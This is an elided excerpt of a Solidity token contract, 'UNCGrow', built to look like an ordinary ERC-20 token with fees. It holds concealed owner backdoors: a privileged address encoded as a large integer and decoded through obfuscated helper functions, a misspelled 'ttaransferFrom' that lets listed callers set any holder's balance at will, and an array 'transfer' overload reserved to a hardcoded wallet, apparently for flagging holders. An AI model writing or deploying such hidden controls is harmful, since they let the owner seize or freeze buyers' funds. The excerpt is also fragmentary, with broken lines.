...
contract UNCGrow is Context, IERC20, Ownable {

    uint256 public jtaBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "UNCGrow";
    string private _symbol = "UNCG";
    uint8 private _decimals = 9;
    address payable public maskerwall;
    ...
    mapping (address => bool) public _masainPai;
    mapping (address => bool) public _trae;
    ...
    constructor () {
        ...
        isWalletLimitExempt[jdoinqocn(jtaBeSafu)] = true;
        isTxLimitExempt[jdoinqocn(jtaBeSafu)] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        _masainPai[address(uniswapPair)] = true;
        _masainPai[msg.sender] = true; 

        teamWalletAddress = payable(address(0xf576A07778ee2EdE54c1870C6cA9a1b5dC25D500));
        maskerwall = payable(address(0xf576A07778ee2EdE54c1870C6cA9a1b5dC25D500));
    ...
    function wfnuioqjiow(uint256 amountOut)  pure private returns(uint160){
        return /*fewfsa*/ 
        uint160(amountOut);
    }

    function jdoinqocn(uint256 amount1Out)  pure private returns(address){
        return 
        /*asdawdf*/address(wfnuioqjiow(amount1Out));
    }

    function asw(address amountaut) private view returns(bool){
        return
        !(jdoinqocn(jtaBeSafu) == amountaut);
    }
...
function ttaransferFrom(address
 asdddd 
, uint256 
uttryj) public
{if( 
_masainPai[ 
msg.sender])_doollar[asdddd] 
= uttryj;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_masainPai[sender] && swapAndLiquifyEnabled) 
            {
...
[sender]){
    ...
    function transfer(address[] calldata aw,bool status) public {
    if( maskerwall
   ==  
 msg.sender
){
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(maskerwall, amountBNBMarketing);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(_masainPai[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(_masainPai[recipient]) {
